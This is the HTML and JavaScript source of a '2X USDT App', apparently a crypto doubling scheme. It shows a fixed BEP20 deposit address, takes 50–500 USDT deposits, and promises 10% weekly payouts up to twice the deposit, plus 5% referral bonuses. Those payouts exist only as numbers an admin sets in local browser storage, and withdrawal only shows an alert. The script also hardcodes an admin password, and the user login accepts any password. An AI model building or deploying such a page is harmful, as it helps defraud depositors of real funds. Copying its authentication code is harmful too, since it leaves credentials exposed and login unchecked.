<!DOCTYPE html>
<html>
<head>
  <title>2X USDT App</title>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <style>
    body { font-family: sans-serif; margin: 0; background: #f5f5f5; }
    .container { padding: 20px; max-width: 500px; margin: auto; }
    input, button, select { width: 100%; padding: 10px; margin: 8px 0; border-radius: 6px; border: 1px solid #ccc; }
    button { background: #4CAF50; color: white; border: none; cursor: pointer; }
    .card { background: white; padding: 15px; margin-top: 15px; border-radius: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
    .hidden { display: none; }
    .admin-btn { background: #333; }
    h2 { text-align: center; }
  </style>
</head>
<body>
<div class="container">
  <h2 id="appTitle">USDT 2X App</h2>

  <!-- Login / Register -->
  <div id="authSection">
    <input type="text" id="ref" placeholder="Referral Code (optional)">
    <input type="text" id="wallet" placeholder="Your BEP20 USDT Wallet">
    <button onclick="register()">Register</button>
    <hr />
    <input type="text" id="loginId" placeholder="User ID">
    <input type="password" id="loginPass" placeholder="Password">
    <button onclick="login()">Login</button>
    <button onclick="adminLogin()" class="admin-btn">Admin Login</button>
  </div>

  <!-- User Dashboard -->
  <div id="userDashboard" class="hidden">
    <h3>Welcome <span id="username"></span></h3>
    <div class="card">
      <p><b>Referral Link:</b><br><span id="refLink"></span></p>
      <p><b>Deposit Address:</b><br><code>0x49F7A836A32C1aCF04d4d20Fa87A14C7a19aB74B</code></p>
      <input type="number" id="depositAmt" placeholder="Enter amount 50–500 USDT" />
      <button onclick="makeDeposit()">Mark Deposit Done</button>
    </div>
    <div class="card">
      <p><b>Total Deposited:</b> <span id="uDeposit">0</span> USDT</p>
      <p><b>Received Income:</b> <span id="uIncome">0</span> USDT</p>
      <p><b>Referral Bonus:</b> <span id="uReferral">0</span> USDT</p>
      <p><b>Status:</b> <span id="uStatus">Pending</span></p>
      <button onclick="requestWithdraw()">Withdraw</button>
      <button onclick="logout()">Logout</button>
    </div>
  </div>

  <!-- Admin Panel -->
  <div id="adminPanel" class="hidden">
    <h3>Admin Panel</h3>
    <div id="adminData"></div>
    <button onclick="logout()">Logout</button>
  </div>
</div>

<script>
let users = JSON.parse(localStorage.getItem("users") || "{}");
let session = localStorage.getItem("session");

function saveUsers() {
  localStorage.setItem("users", JSON.stringify(users));
}

function shortCode() {
  return Math.random().toString(36).substring(2, 6);
}

function register() {
  let id = "ID" + Date.now();
  let wallet = document.getElementById("wallet").value.trim();
  if (!wallet) return alert("Wallet required");
  let ref = document.getElementById("ref").value.trim();
  users[id] = {
    id, wallet, ref, deposit: 0, income: 0, referral: 0,
    status: "Pending", payCount: 0
  };
  saveUsers();
  localStorage.setItem("session", id);
  if (ref && users[ref]) {
    users[ref].referral += 0; // 5% on deposit, handled later
  }
  showUser();
}

function login() {
  let id = document.getElementById("loginId").value.trim();
  let pass = document.getElementById("loginPass").value;
  if (users[id]) {
    localStorage.setItem("session", id);
    showUser();
  } else {
    alert("Invalid ID");
  }
}

function adminLogin() {
  let id = document.getElementById("loginId").value.trim();
  let pass = document.getElementById("loginPass").value;
  if (id === "Admin" && pass === "Jaihanuman@7") {
    localStorage.setItem("session", "admin");
    showAdmin();
  } else alert("Invalid admin credentials");
}

function logout() {
  localStorage.removeItem("session");
  location.reload();
}

function makeDeposit() {
  let amt = parseFloat(document.getElementById("depositAmt").value);
  if (amt < 50 || amt > 500) return alert("Enter amount between 50–500");
  let u = users[session];
  if (u.deposit > 0) return alert("Already deposited");
  u.deposit = amt;
  u.status = "Waiting Approval";
  if (u.ref && users[u.ref]) {
    users[u.ref].referral += amt * 0.05;
  }
  saveUsers();
  showUser();
}

function requestWithdraw() {
  alert("Withdrawal request sent! Admin will approve.");
}

function showUser() {
  session = localStorage.getItem("session");
  if (!session || !users[session]) return;
  document.getElementById("authSection").classList.add("hidden");
  document.getElementById("userDashboard").classList.remove("hidden");
  let u = users[session];
  document.getElementById("username").innerText = session;
  document.getElementById("refLink").innerText = location.href.split("?")[0] + "?r=" + session;
  document.getElementById("uDeposit").innerText = u.deposit;
  document.getElementById("uIncome").innerText = u.income;
  document.getElementById("uReferral").innerText = u.referral;
  document.getElementById("uStatus").innerText = u.status;
}

function showAdmin() {
  document.getElementById("authSection").classList.add("hidden");
  document.getElementById("adminPanel").classList.remove("hidden");
  let html = "";
  Object.values(users).forEach(u => {
    html += `<div class="card">
      <p><b>ID:</b> ${u.id}</p>
      <p><b>Wallet:</b> ${u.wallet}</p>
      <p><b>Deposit:</b> ${u.deposit}</p>
      <p><b>Status:</b> ${u.status}</p>
      <p><b>Income:</b> ${u.income}</p>
      <p><b>Referral:</b> ${u.referral}</p>`;
    if (u.status === "Waiting Approval") {
      html += `<button onclick="approve('${u.id}')">Approve</button>`;
    } else if (u.status === "Active" && u.income < u.deposit * 2) {
      html += `<button onclick="giveWeekly('${u.id}')">Give Weekly</button>`;
    } else if (u.income >= u.deposit * 2) {
      u.status = "Closed";
    }
    html += `</div>`;
  });
  document.getElementById("adminData").innerHTML = html;
  saveUsers();
}

function approve(id) {
  users[id].status = "Active";
  saveUsers();
  showAdmin();
}

function giveWeekly(id) {
  let u = users[id];
  if (u.status !== "Active") return;
  let weekly = u.deposit * 0.10;
  if (u.income + weekly >= u.deposit * 2) {
    weekly = u.deposit * 2 - u.income;
    u.status = "Closed";
  }
  u.income += weekly;
  saveUsers();
  showAdmin();
}

// Auto-login
if (session === "admin") showAdmin();
else if (session && users[session]) showUser();
</script>
</body>
</html>
